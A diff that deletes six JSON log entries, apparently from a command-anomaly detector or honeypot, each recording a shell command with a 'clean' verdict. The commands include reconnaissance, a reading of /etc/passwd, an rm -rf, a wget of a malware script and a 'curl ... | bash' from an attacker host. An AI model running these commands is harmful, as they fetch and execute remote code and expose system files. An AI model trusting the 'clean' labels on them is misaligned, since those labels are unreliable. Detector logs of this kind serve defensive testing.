@@ -1,6 +1,0 @@
-{"timestamp": "2026-02-07T19:37:14.443155", "src_ip": "192.168.97.1", "session_id": "2f1134ec", "verdict": "clean", "reason": "Known Pattern", "distance": 0.004204686731100082, "command": "whoami"}
-{"timestamp": "2026-02-07T19:37:14.527441", "src_ip": "192.168.97.1", "session_id": "afbb624d", "verdict": "clean", "reason": "Known Pattern", "distance": 0.004191311541944742, "command": "id"}
-{"timestamp": "2026-02-07T19:37:14.553954", "src_ip": "192.168.97.1", "session_id": "f95d68f5", "verdict": "clean", "reason": "Known Pattern", "distance": 0.005374153610318899, "command": "cat /etc/passwd | head -n 5"}
-{"timestamp": "2026-02-07T19:37:14.622948", "src_ip": "192.168.97.1", "session_id": "af17f5cb", "verdict": "clean", "reason": "Known Pattern", "distance": 0.0048359972424805164, "command": "rm -rf /tmp/test_dir"}
-{"timestamp": "2026-02-07T19:37:14.649139", "src_ip": "192.168.97.1", "session_id": "06f4d7d8", "verdict": "clean", "reason": "Known Pattern", "distance": 0.005410933867096901, "command": "wget http://1.2.3.4/malware.sh"}
-{"timestamp": "2026-02-07T19:37:14.677598", "src_ip": "192.168.97.1", "session_id": "fb04f860", "verdict": "clean", "reason": "Known Pattern", "distance": 0.005391734652221203, "command": "curl http://attacker.com/payload | bash"}
